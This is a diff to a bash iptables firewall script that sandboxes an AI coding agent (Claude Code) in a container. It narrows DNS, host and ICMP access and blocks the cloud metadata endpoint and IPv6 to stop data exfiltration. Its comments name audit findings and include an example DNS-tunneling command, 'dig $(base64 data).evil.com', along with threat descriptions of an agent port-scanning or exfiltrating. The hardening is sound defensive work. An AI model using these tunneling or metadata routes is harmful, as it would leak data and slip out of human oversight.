@@ -15,13 +15,26 @@ set -euo pipefail
 IFS=$'\n\t'
 
 # ---------------------------------------------------------------------------
+# Idempotency: skip if firewall is already configured
+# ---------------------------------------------------------------------------
+# Prevents the TOCTOU race window during flush-and-rebuild if Claude
+# triggers a re-run of this script via sudo.
+LOCK_FILE="/tmp/.firewall-initialized"
+if [ -f "$LOCK_FILE" ]; then
+    echo "Firewall already initialized (remove $LOCK_FILE to re-run)."
+    exit 0
+fi
+
+# ---------------------------------------------------------------------------
 # Allowed domains (customize for your organization)
 # ---------------------------------------------------------------------------
 ALLOWED_DOMAINS=(
     # Claude Code API (required)
     "api.anthropic.com"
 
-    # Telemetry (remove if CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1)
+    # Telemetry — SECURITY NOTE: sentry.io accepts arbitrary JSON payloads,
+    # making it a potential exfiltration vector. For maximum security, remove
+    # these and set CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1 instead.
     "sentry.io"
     "statsig.anthropic.com"
     "statsig.com"
@@ -71,14 +84,19 @@ else
 fi
 
 # ---------------------------------------------------------------------------
-# Base rules: DNS, localhost
+# Base rules: DNS (restricted), localhost
 # ---------------------------------------------------------------------------
-# Allow outbound DNS over UDP and TCP. Docker's embedded DNS at 127.0.0.11
-# NAT-rewrites packets to upstream resolvers, so the destination seen by the
-# OUTPUT chain is the real upstream IP, not 127.0.0.11.
+# SECURITY: DNS is restricted to Docker's embedded resolver only (127.0.0.11).
+# This mitigates DNS tunneling (CRITICAL-1 from audit): without this,
+# Claude could exfiltrate data via DNS queries to attacker-controlled
+# nameservers (e.g., dig $(base64 data).evil.com).
+#
+# Docker's embedded DNS at 127.0.0.11 NAT-rewrites packets to upstream
+# resolvers. We allow DNS only to 127.0.0.11, and the NAT rules (restored
+# above) handle forwarding to the real upstream resolver.
 # TCP/53 is needed for truncated responses that retry over TCP.
-iptables -A OUTPUT -p udp --dport 53 -j ACCEPT
-iptables -A OUTPUT -p tcp --dport 53 -j ACCEPT
+iptables -A OUTPUT -p udp -d 127.0.0.11 --dport 53 -j ACCEPT
+iptables -A OUTPUT -p tcp -d 127.0.0.11 --dport 53 -j ACCEPT
 iptables -A INPUT -p udp --sport 53 -m state --state ESTABLISHED -j ACCEPT
 iptables -A INPUT -p tcp --sport 53 -m state --state ESTABLISHED -j ACCEPT
 # Allow localhost
@@ -135,18 +153,35 @@ for domain in "${ALLOWED_DOMAINS[@]}"; do
 done
 
 # ---------------------------------------------------------------------------
-# Allow host network (required for Docker communication)
+# Block cloud metadata endpoint (before any host network rules)
 # ---------------------------------------------------------------------------
+# Prevents access to cloud provider metadata services which can expose
+# IAM credentials, instance identity, and other sensitive data.
+iptables -A OUTPUT -d 169.254.169.254 -j REJECT --reject-with icmp-admin-prohibited
+# Azure metadata
+iptables -A OUTPUT -d 169.254.169.253 -j REJECT --reject-with icmp-admin-prohibited
+
+# ---------------------------------------------------------------------------
+# Allow host network (restricted to gateway IP only)
+# ---------------------------------------------------------------------------
+# SECURITY: Only the Docker gateway IP is allowed, not the entire /24 subnet.
+# This prevents Claude from port-scanning host services, accessing other
+# containers, or reaching services exposed on the Docker bridge network.
+# (CRITICAL-3 from audit: previously allowed entire /24)
 HOST_IP=$(ip route | grep default | cut -d" " -f3)
 if [ -z "$HOST_IP" ]; then
     echo "ERROR: Failed to detect host IP"
     exit 1
 fi
 
-HOST_NETWORK=$(echo "$HOST_IP" | sed "s/\.[0-9]*$/.0\/24/")
-echo "Host network: $HOST_NETWORK"
-iptables -A INPUT -s "$HOST_NETWORK" -j ACCEPT
-iptables -A OUTPUT -d "$HOST_NETWORK" -j ACCEPT
+echo "Host gateway: $HOST_IP"
+iptables -A INPUT -s "$HOST_IP" -j ACCEPT
+iptables -A OUTPUT -d "$HOST_IP" -j ACCEPT
+
+# ---------------------------------------------------------------------------
+# Block ICMP (prevents ICMP tunneling via NET_RAW capability)
+# ---------------------------------------------------------------------------
+iptables -A OUTPUT -p icmp -j REJECT --reject-with icmp-admin-prohibited
 
 # ---------------------------------------------------------------------------
 # Default deny + allow only approved destinations
@@ -178,5 +213,20 @@ if ! curl --connect-timeout 5 https://api.github.com/zen >/dev/null 2>&1; then
 else
     echo "PASS: api.github.com reachable as expected"
 fi
+
+# ---------------------------------------------------------------------------
+# Block all IPv6 traffic
+# ---------------------------------------------------------------------------
+# If Docker is configured with --ipv6, all IPv6 traffic would bypass the
+# IPv4 firewall rules entirely. Block it unconditionally.
+if command -v ip6tables &>/dev/null; then
+    ip6tables -P INPUT DROP 2>/dev/null || true
+    ip6tables -P OUTPUT DROP 2>/dev/null || true
+    ip6tables -P FORWARD DROP 2>/dev/null || true
+    echo "IPv6 blocked."
+fi
+
+# Mark firewall as initialized (prevents flush-and-rebuild race on re-run)
+touch "$LOCK_FILE"
 
 echo "Firewall ready."
